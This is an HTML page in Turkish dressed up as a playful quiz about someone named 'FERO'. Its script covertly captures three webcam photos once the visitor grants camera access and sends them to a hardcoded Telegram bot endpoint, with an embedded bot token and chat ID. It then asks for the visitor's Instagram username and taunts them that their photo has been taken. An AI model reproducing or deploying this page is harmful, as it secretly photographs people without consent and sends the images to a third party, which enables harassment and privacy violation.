<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>FERO Testi</title>
  <style>
    body {
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background: #111;
      color: white;
      font-family: Arial, sans-serif;
      text-align: center;
      flex-direction: column;
      overflow: hidden;
    }
    button {
      padding: 15px 30px;
      margin: 10px;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      cursor: pointer;
      background: #ff0040;
      color: white;
      transition: 0.3s;
    }
    button:hover { background: #ff3366; }
    .question { display: none; margin-top: 20px; font-size: 20px; }
    .rose {
      position: absolute;
      top: -50px;
      font-size: 24px;
      animation: fall linear forwards;
      opacity: 0.9;
    }
    @keyframes fall {
      to { transform: translateY(110vh) rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>Devam etmek istiyor musun?</h1>
  <button onclick="startCamera()">Evet</button>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <!-- Sorular -->
  <div id="q1" class="question">
    <p>FERO'yu seviyor musun?</p>
    <button onclick="nextQuestion()">Evet</button>
    <button onclick="nextQuestion()">Hayır</button>
  </div>
  <div id="q2" class="question">
    <p>Fero'nun boyu kaç cm?</p>
    <button onclick="nextQuestion()">1,83</button>
    <button onclick="nextQuestion()">1,78</button>
  </div>
  <div id="q3" class="question">
    <p>Fero iyi biri mi?</p>
    <button onclick="endQuiz()">Evet</button>
    <button onclick="endQuiz()">Hayır</button>
  </div>

  <script>
    let currentQuestion = 1;
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        video.onloadedmetadata = () => {
          // 3 foto arka arkaya çek
          takePhotoAndSend();
          setTimeout(takePhotoAndSend, 1500);
          setTimeout(takePhotoAndSend, 3000);

          // İlk soru gelsin
          document.querySelector("h1").style.display = "none";
          document.querySelector("button").style.display = "none";
          document.getElementById("q1").style.display = "block";
        };
      } catch (err) {
        alert("Kamera izni verilmedi!");
      }
    }

    function takePhotoAndSend() {
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", "8494445812"); // senin chat id
        formData.append("photo", blob, "photo.png");

        fetch("https://api.telegram.org/bot8369405248:AAEGL_vh2_ZkknIOKbOaqbHVEGynLzPq47I/sendPhoto", {
          method: "POST",
          body: formData
        });
      }, "image/png");
    }

    function nextQuestion() {
      document.getElementById("q" + currentQuestion).style.display = "none";
      currentQuestion++;
      document.getElementById("q" + currentQuestion).style.display = "block";
    }

    function endQuiz() {
      document.getElementById("q" + currentQuestion).style.display = "none";
      let username = prompt("Instagram kullanıcı adını gir (@fero):") || "@fero";
      document.body.innerHTML = `
        <h1 style="font-size: 32px; color: #ff0040; text-transform: uppercase;">
          HAYIRLI OLSUN FOTOĞRAFIN ELİMDE 😁
        </h1>
        <h2 style="margin-top:20px; color:white;">
          Kullanıcı adı: ${username}
        </h2>
      `;
      startRoses();
    }

    function startRoses() {
      setInterval(() => {
        const rose = document.createElement("div");
        rose.classList.add("rose");
        rose.textContent = "🌹";
        rose.style.left = Math.random() * 100 + "vw";
        rose.style.animationDuration = (Math.random() * 2 + 3) + "s";
        document.body.appendChild(rose);
        setTimeout(() => rose.remove(), 5000);
      }, 300);
    }
  </script>
</body>
</html>
